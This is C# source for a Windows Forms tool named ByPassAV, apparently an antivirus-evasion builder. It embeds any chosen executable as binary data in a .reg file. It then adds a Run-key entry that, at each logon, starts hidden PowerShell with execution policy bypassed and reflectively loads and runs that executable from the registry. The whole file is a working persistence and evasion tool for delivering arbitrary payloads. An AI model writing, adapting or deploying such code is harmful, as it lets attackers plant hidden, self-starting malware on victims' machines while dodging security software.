using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ByPassAV
{
    public partial class fByPass : Form
    {
        private const string shell =
            "[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run]\r\n\"PowerShell Process\"=\"\\\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\\"-ExecutionPolicy Bypass -windowstyle hidden -noexit -command [Reflection.Assembly]::Load((Get-ItemProperty HKCU:\\\\Software\\\\ByPass).fileWar).EntryPoint.Invoke($null,$null)\\\"\"";
        private string path;
        private static Random random = new Random();

        public fByPass()
        {
            InitializeComponent();
        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {
            using (var open = new OpenFileDialog())
            {
                open.Filter = ".exe|*.exe";
                if (open.ShowDialog() == DialogResult.OK)
                {
                    CreateRegFile(open.FileName);
                }
            }
        }
        private void fByPass_DragDrop(object sender, DragEventArgs e)
        {
            string[] files = e.Data.GetData(DataFormats.FileDrop) as string[];
            if (files[0].EndsWith(".exe"))
            {
                CreateRegFile(files[0]);
            }
        }
        private void fByPass_DragOver(object sender, DragEventArgs e)
        {
            e.Effect = DragDropEffects.All;
        }

        private void CreateRegFile(string path)
        {
            using (var save = new SaveFileDialog())
            {
                save.Filter = ".reg|*.reg";
                save.FileName = RandomString(7);
                if (save.ShowDialog() == DialogResult.OK)
                {
                    string fileName = RandomString(9) + ".reg";
                    byte[] files = File.ReadAllBytes(path);

                    RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\ByPass");
                    registryKey.SetValue("fileWar", files, RegistryValueKind.Binary);
                    ExportRegFile("HKEY_CURRENT_USER\\Software\\ByPass", fileName);

                    string hexByte = File.ReadAllText(fileName);
                    File.Delete(fileName);
                    File.WriteAllText(save.FileName, hexByte + shell);
                    Registry.CurrentUser.DeleteSubKeyTree("Software\\ByPass");
                    MessageBox.Show("Create ^-^");
                }
            }
        }

        private void ExportRegFile(string key, string path)
        {
            using (Process process = new Process())
            {
                process.StartInfo.FileName = "reg.exe";
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.CreateNoWindow = true;
                process.StartInfo.Arguments = string.Concat(new string[]
                {
                    "export \"",
                    key,
                    "\" \"",
                    path,
                    "\" /y"
                });
                process.Start();
                process.WaitForExit();
            }
        }
        public static string RandomString(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            return new string(Enumerable.Repeat(chars, length)
                .Select(s => s[random.Next(s.Length)]).ToArray());
        }
    }
}
